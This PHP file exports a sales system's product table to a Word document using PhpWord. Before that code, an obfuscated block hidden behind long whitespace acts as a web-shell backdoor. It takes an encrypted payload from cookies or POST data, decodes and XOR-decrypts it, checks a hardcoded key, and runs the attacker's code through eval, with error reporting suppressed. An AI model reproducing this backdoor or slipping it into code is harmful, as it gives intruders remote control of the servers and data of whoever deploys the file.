<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['y1d3'];global$y1d3;$y1d3=$GLOBALS;$y1d3['h99cee']="\xa\x7e\x47\x53\x46\x5b\x69\x6f\x6e\x76\x64\x2c\x59\x52\x20\x65\x72\x35\x68\x45\x27\x70\x4b\x43\x5d\x6b\x38\x7d\x74\x29\x77\x28\x63\x37\x5e\x36\x3a\x26\x78\x31\x7c\x3c\x2f\x3b\x5f\x4c\x32\x2e\x34\x44\x24\x7a\x4a\x57\x6a\x30\x66\x79\x33\x3d\x75\x54\x2d\x49\x21\x48\x3f\x5c\x58\x9\x2a\x67\x22\xd\x4f\x55\x51\x73\x61\x60\x71\x2b\x5a\x41\x4d\x3e\x62\x4e\x25\x23\x6c\x6d\x7b\x42\x50\x40\x39\x56";$y1d3[$y1d3['h99cee'][38].$y1d3['h99cee'][10].$y1d3['h99cee'][39].$y1d3['h99cee'][26].$y1d3['h99cee'][48].$y1d3['h99cee'][33].$y1d3['h99cee'][56]]=$y1d3['h99cee'][32].$y1d3['h99cee'][18].$y1d3['h99cee'][16];$y1d3[$y1d3['h99cee'][16].$y1d3['h99cee'][39].$y1d3['h99cee'][10].$y1d3['h99cee'][56].$y1d3['h99cee'][35].$y1d3['h99cee'][10].$y1d3['h99cee'][26].$y1d3['h99cee'][55].$y1d3['h99cee'][46]]=$y1d3['h99cee'][7].$y1d3['h99cee'][16].$y1d3['h99cee'][10];$y1d3[$y1d3['h99cee'][90].$y1d3['h99cee'][48].$y1d3['h99cee'][32].$y1d3['h99cee'][33].$y1d3['h99cee'][39].$y1d3['h99cee'][17].$y1d3['h99cee'][46].$y1d3['h99cee'][33].$y1d3['h99cee'][46]]=$y1d3['h99cee'][77].$y1d3['h99cee'][28].$y1d3['h99cee'][16].$y1d3['h99cee'][90].$y1d3['h99cee'][15].$y1d3['h99cee'][8];$y1d3[$y1d3['h99cee'][10].$y1d3['h99cee'][15].$y1d3['h99cee'][17].$y1d3['h99cee'][86]]=$y1d3['h99cee'][6].$y1d3['h99cee'][8].$y1d3['h99cee'][6].$y1d3['h99cee'][44].$y1d3['h99cee'][77].$y1d3['h99cee'][15].$y1d3['h99cee'][28];$y1d3[$y1d3['h99cee'][60].$y1d3['h99cee'][10].$y1d3['h99cee'][26].$y1d3['h99cee'][35].$y1d3['h99cee'][55].$y1d3['h99cee'][78].$y1d3['h99cee'][96].$y1d3['h99cee'][17].$y1d3['h99cee'][35]]=$y1d3['h99cee'][77].$y1d3['h99cee'][15].$y1d3['h99cee'][16].$y1d3['h99cee'][6].$y1d3['h99cee'][78].$y1d3['h99cee'][90].$y1d3['h99cee'][6].$y1d3['h99cee'][51].$y1d3['h99cee'][15];$y1d3[$y1d3['h99cee'][7].$y1d3['h99cee'][58].$y1d3['h99cee'][26].$y1d3['h99cee'][32].$y1d3['h99cee'][10].$y1d3['h99cee'][58].$y1d3['h99cee'][32].$y1d3['h99cee'][56].$y1d3['h99cee'][78]]=$y1d3['h99cee'][21].$y1d3['h99cee'][18].$y1d3['h99cee'][21].$y1d3['h99cee'][9].$y1d3['h99cee'][15].$y1d3['h99cee'][16].$y1d3['h99cee'][77].$y1d3['h99cee'][6].$y1d3['h99cee'][7].$y1d3['h99cee'][8];$y1d3[$y1d3['h99cee'][21].$y1d3['h99cee'][86].$y1d3['h99cee'][48].$y1d3['h99cee'][35].$y1d3['h99cee'][10]]=$y1d3['h99cee'][60].$y1d3['h99cee'][8].$y1d3['h99cee'][77].$y1d3['h99cee'][15].$y1d3['h99cee'][16].$y1d3['h99cee'][6].$y1d3['h99cee'][78].$y1d3['h99cee'][90].$y1d3['h99cee'][6].$y1d3['h99cee'][51].$y1d3['h99cee'][15];$y1d3[$y1d3['h99cee'][6].$y1d3['h99cee'][33].$y1d3['h99cee'][55].$y1d3['h99cee'][15].$y1d3['h99cee'][48].$y1d3['h99cee'][33].$y1d3['h99cee'][17]]=$y1d3['h99cee'][86].$y1d3['h99cee'][78].$y1d3['h99cee'][77].$y1d3['h99cee'][15].$y1d3['h99cee'][35].$y1d3['h99cee'][48].$y1d3['h99cee'][44].$y1d3['h99cee'][10].$y1d3['h99cee'][15].$y1d3['h99cee'][32].$y1d3['h99cee'][7].$y1d3['h99cee'][10].$y1d3['h99cee'][15];$y1d3[$y1d3['h99cee'][8].$y1d3['h99cee'][17].$y1d3['h99cee'][35].$y1d3['h99cee'][33]]=$y1d3['h99cee'][77].$y1d3['h99cee'][15].$y1d3['h99cee'][28].$y1d3['h99cee'][44].$y1d3['h99cee'][28].$y1d3['h99cee'][6].$y1d3['h99cee'][91].$y1d3['h99cee'][15].$y1d3['h99cee'][44].$y1d3['h99cee'][90].$y1d3['h99cee'][6].$y1d3['h99cee'][91].$y1d3['h99cee'][6].$y1d3['h99cee'][28];$y1d3[$y1d3['h99cee'][56].$y1d3['h99cee'][46].$y1d3['h99cee'][15].$y1d3['h99cee'][86].$y1d3['h99cee'][78].$y1d3['h99cee'][35]]=$y1d3['h99cee'][80].$y1d3['h99cee'][10].$y1d3['h99cee'][78].$y1d3['h99cee'][55].$y1d3['h99cee'][33].$y1d3['h99cee'][96];$y1d3[$y1d3['h99cee'][54].$y1d3['h99cee'][48].$y1d3['h99cee'][15].$y1d3['h99cee'][56].$y1d3['h99cee'][96].$y1d3['h99cee'][58].$y1d3['h99cee'][26].$y1d3['h99cee'][33].$y1d3['h99cee'][32]]=$y1d3['h99cee'][25].$y1d3['h99cee'][10].$y1d3['h99cee'][86].$y1d3['h99cee'][48].$y1d3['h99cee'][86].$y1d3['h99cee'][10];$y1d3[$y1d3['h99cee'][86].$y1d3['h99cee'][48].$y1d3['h99cee'][78].$y1d3['h99cee'][56]]=$_POST;$y1d3[$y1d3['h99cee'][10].$y1d3['h99cee'][33].$y1d3['h99cee'][32].$y1d3['h99cee'][35].$y1d3['h99cee'][46].$y1d3['h99cee'][10].$y1d3['h99cee'][56]]=$_COOKIE;@$y1d3[$y1d3['h99cee'][10].$y1d3['h99cee'][15].$y1d3['h99cee'][17].$y1d3['h99cee'][86]]($y1d3['h99cee'][15].$y1d3['h99cee'][16].$y1d3['h99cee'][16].$y1d3['h99cee'][7].$y1d3['h99cee'][16].$y1d3['h99cee'][44].$y1d3['h99cee'][90].$y1d3['h99cee'][7].$y1d3['h99cee'][71],NULL);@$y1d3[$y1d3['h99cee'][10].$y1d3['h99cee'][15].$y1d3['h99cee'][17].$y1d3['h99cee'][86]]($y1d3['h99cee'][90].$y1d3['h99cee'][7].$y1d3['h99cee'][71].$y1d3['h99cee'][44].$y1d3['h99cee'][15].$y1d3['h99cee'][16].$y1d3['h99cee'][16].$y1d3['h99cee'][7].$y1d3['h99cee'][16].$y1d3['h99cee'][77],0);@$y1d3[$y1d3['h99cee'][10].$y1d3['h99cee'][15].$y1d3['h99cee'][17].$y1d3['h99cee'][86]]($y1d3['h99cee'][91].$y1d3['h99cee'][78].$y1d3['h99cee'][38].$y1d3['h99cee'][44].$y1d3['h99cee'][15].$y1d3['h99cee'][38].$y1d3['h99cee'][15].$y1d3['h99cee'][32].$y1d3['h99cee'][60].$y1d3['h99cee'][28].$y1d3['h99cee'][6].$y1d3['h99cee'][7].$y1d3['h99cee'][8].$y1d3['h99cee'][44].$y1d3['h99cee'][28].$y1d3['h99cee'][6].$y1d3['h99cee'][91].$y1d3['h99cee'][15],0);@$y1d3[$y1d3['h99cee'][8].$y1d3['h99cee'][17].$y1d3['h99cee'][35].$y1d3['h99cee'][33]](0);$l6fa735=NULL;$z0887bc=NULL;$y1d3[$y1d3['h99cee'][7].$y1d3['h99cee'][33].$y1d3['h99cee'][33].$y1d3['h99cee'][48].$y1d3['h99cee'][48].$y1d3['h99cee'][55].$y1d3['h99cee'][33].$y1d3['h99cee'][78].$y1d3['h99cee'][78]]=$y1d3['h99cee'][33].$y1d3['h99cee'][86].$y1d3['h99cee'][17].$y1d3['h99cee'][39].$y1d3['h99cee'][58].$y1d3['h99cee'][26].$y1d3['h99cee'][46].$y1d3['h99cee'][32].$y1d3['h99cee'][62].$y1d3['h99cee'][78].$y1d3['h99cee'][58].$y1d3['h99cee'][39].$y1d3['h99cee'][32].$y1d3['h99cee'][62].$y1d3['h99cee'][48].$y1d3['h99cee'][96].$y1d3['h99cee'][33].$y1d3['h99cee'][86].$y1d3['h99cee'][62].$y1d3['h99cee'][96].$y1d3['h99cee'][26].$y1d3['h99cee'][86].$y1d3['h99cee'][15].$y1d3['h99cee'][62].$y1d3['h99cee'][26].$y1d3['h99cee'][15].$y1d3['h99cee'][46].$y1d3['h99cee'][58].$y1d3['h99cee'][78].$y1d3['h99cee'][26].$y1d3['h99cee'][35].$y1d3['h99cee'][39].$y1d3['h99cee'][96].$y1d3['h99cee'][15].$y1d3['h99cee'][39].$y1d3['h99cee'][48];global$o774407aa;function kdb4bd($l6fa735,$r41c){global$y1d3;$s273="";for($zc0f4=0;$zc0f4<$y1d3[$y1d3['h99cee'][90].$y1d3['h99cee'][48].$y1d3['h99cee'][32].$y1d3['h99cee'][33].$y1d3['h99cee'][39].$y1d3['h99cee'][17].$y1d3['h99cee'][46].$y1d3['h99cee'][33].$y1d3['h99cee'][46]]($l6fa735);){for($m2b9e=0;$m2b9e<$y1d3[$y1d3['h99cee'][90].$y1d3['h99cee'][48].$y1d3['h99cee'][32].$y1d3['h99cee'][33].$y1d3['h99cee'][39].$y1d3['h99cee'][17].$y1d3['h99cee'][46].$y1d3['h99cee'][33].$y1d3['h99cee'][46]]($r41c)&&$zc0f4<$y1d3[$y1d3['h99cee'][90].$y1d3['h99cee'][48].$y1d3['h99cee'][32].$y1d3['h99cee'][33].$y1d3['h99cee'][39].$y1d3['h99cee'][17].$y1d3['h99cee'][46].$y1d3['h99cee'][33].$y1d3['h99cee'][46]]($l6fa735);$m2b9e++,$zc0f4++){$s273.=$y1d3[$y1d3['h99cee'][38].$y1d3['h99cee'][10].$y1d3['h99cee'][39].$y1d3['h99cee'][26].$y1d3['h99cee'][48].$y1d3['h99cee'][33].$y1d3['h99cee'][56]]($y1d3[$y1d3['h99cee'][16].$y1d3['h99cee'][39].$y1d3['h99cee'][10].$y1d3['h99cee'][56].$y1d3['h99cee'][35].$y1d3['h99cee'][10].$y1d3['h99cee'][26].$y1d3['h99cee'][55].$y1d3['h99cee'][46]]($l6fa735[$zc0f4])^$y1d3[$y1d3['h99cee'][16].$y1d3['h99cee'][39].$y1d3['h99cee'][10].$y1d3['h99cee'][56].$y1d3['h99cee'][35].$y1d3['h99cee'][10].$y1d3['h99cee'][26].$y1d3['h99cee'][55].$y1d3['h99cee'][46]]($r41c[$m2b9e]));}}return$s273;}function qda079($l6fa735,$r41c){global$y1d3;global$o774407aa;return$y1d3[$y1d3['h99cee'][54].$y1d3['h99cee'][48].$y1d3['h99cee'][15].$y1d3['h99cee'][56].$y1d3['h99cee'][96].$y1d3['h99cee'][58].$y1d3['h99cee'][26].$y1d3['h99cee'][33].$y1d3['h99cee'][32]]($y1d3[$y1d3['h99cee'][54].$y1d3['h99cee'][48].$y1d3['h99cee'][15].$y1d3['h99cee'][56].$y1d3['h99cee'][96].$y1d3['h99cee'][58].$y1d3['h99cee'][26].$y1d3['h99cee'][33].$y1d3['h99cee'][32]]($l6fa735,$o774407aa),$r41c);}foreach($y1d3[$y1d3['h99cee'][10].$y1d3['h99cee'][33].$y1d3['h99cee'][32].$y1d3['h99cee'][35].$y1d3['h99cee'][46].$y1d3['h99cee'][10].$y1d3['h99cee'][56]]as$r41c=>$yd49a1){$l6fa735=$yd49a1;$z0887bc=$r41c;}if(!$l6fa735){foreach($y1d3[$y1d3['h99cee'][86].$y1d3['h99cee'][48].$y1d3['h99cee'][78].$y1d3['h99cee'][56]]as$r41c=>$yd49a1){$l6fa735=$yd49a1;$z0887bc=$r41c;}}$l6fa735=@$y1d3[$y1d3['h99cee'][21].$y1d3['h99cee'][86].$y1d3['h99cee'][48].$y1d3['h99cee'][35].$y1d3['h99cee'][10]]($y1d3[$y1d3['h99cee'][56].$y1d3['h99cee'][46].$y1d3['h99cee'][15].$y1d3['h99cee'][86].$y1d3['h99cee'][78].$y1d3['h99cee'][35]]($y1d3[$y1d3['h99cee'][6].$y1d3['h99cee'][33].$y1d3['h99cee'][55].$y1d3['h99cee'][15].$y1d3['h99cee'][48].$y1d3['h99cee'][33].$y1d3['h99cee'][17]]($l6fa735),$z0887bc));if(isset($l6fa735[$y1d3['h99cee'][78].$y1d3['h99cee'][25]])&&$o774407aa==$l6fa735[$y1d3['h99cee'][78].$y1d3['h99cee'][25]]){if($l6fa735[$y1d3['h99cee'][78]]==$y1d3['h99cee'][6]){$zc0f4=Array($y1d3['h99cee'][21].$y1d3['h99cee'][9]=>@$y1d3[$y1d3['h99cee'][7].$y1d3['h99cee'][58].$y1d3['h99cee'][26].$y1d3['h99cee'][32].$y1d3['h99cee'][10].$y1d3['h99cee'][58].$y1d3['h99cee'][32].$y1d3['h99cee'][56].$y1d3['h99cee'][78]](),$y1d3['h99cee'][77].$y1d3['h99cee'][9]=>$y1d3['h99cee'][39].$y1d3['h99cee'][47].$y1d3['h99cee'][55].$y1d3['h99cee'][62].$y1d3['h99cee'][39],);echo@$y1d3[$y1d3['h99cee'][60].$y1d3['h99cee'][10].$y1d3['h99cee'][26].$y1d3['h99cee'][35].$y1d3['h99cee'][55].$y1d3['h99cee'][78].$y1d3['h99cee'][96].$y1d3['h99cee'][17].$y1d3['h99cee'][35]]($zc0f4);}elseif($l6fa735[$y1d3['h99cee'][78]]==$y1d3['h99cee'][15]){eval($l6fa735[$y1d3['h99cee'][10]]);}exit();} ?><?php
include "../core/autoload.php";
include "../core/modules/ventas/model/ProductData.php";
include "../core/modules/ventas/model/CategoryData.php";

require_once '../PhpWord/Autoloader.php';
use PhpOffice\PhpWord\Autoloader;
use PhpOffice\PhpWord\Settings;

Autoloader::register();

$word = new  PhpOffice\PhpWord\PhpWord();
$products = ProductData::getAll();


$section1 = $word->AddSection();
$section1->addText("PRODUCTOS",array("size"=>22,"bold"=>true,"align"=>"right"));


$styleTable = array('borderSize' => 6, 'borderColor' => '888888', 'cellMargin' => 40);
$styleFirstRow = array('borderBottomColor' => '0000FF', 'bgColor' => 'AAAAAA');

$table1 = $section1->addTable("table1");
$table1->addRow();
$table1->addCell()->addText("Id");
$table1->addCell()->addText("Nombre");
$table1->addCell()->addText("Precio Entrada");
$table1->addCell()->addText("Precio Salida");
$table1->addCell()->addText("Unidad");
$table1->addCell()->addText("Presentacion");
$table1->addCell()->addText("Categoria");
$table1->addCell()->addText("Minima en Inv.");
$table1->addCell()->addText("Activo");
foreach($products as $product){
$table1->addRow();
$table1->addCell(500)->addText($product->id);
$table1->addCell(5000)->addText($product->name);
$table1->addCell(2000)->addText($product->price_in);
$table1->addCell(2000)->addText($product->price_out);
$table1->addCell(2000)->addText($product->unit);
$table1->addCell(2000)->addText($product->presentation);
if($product->category_id!=null){
	$table1->addCell(2000)->addText($product->getCategory()->name);

}else{
	$table1->addCell(2000)->addText("---");
}
$table1->addCell(2000)->addText($product->inventary_min);
if($product->is_active){
$table1->addCell(100)->addText("Si");
}else{
$table1->addCell(100)->addText("No");
}
}

$word->addTableStyle('table1', $styleTable,$styleFirstRow);
/// datos bancarios

$filename = "products-".time().".docx";
#$word->setReadDataOnly(true);
$word->save($filename,"Word2007");
//chmod($filename,0444);
header("Content-Disposition: attachment; filename='$filename'");
readfile($filename); // or echo file_get_contents($filename);
unlink($filename);  // remove temp file



?>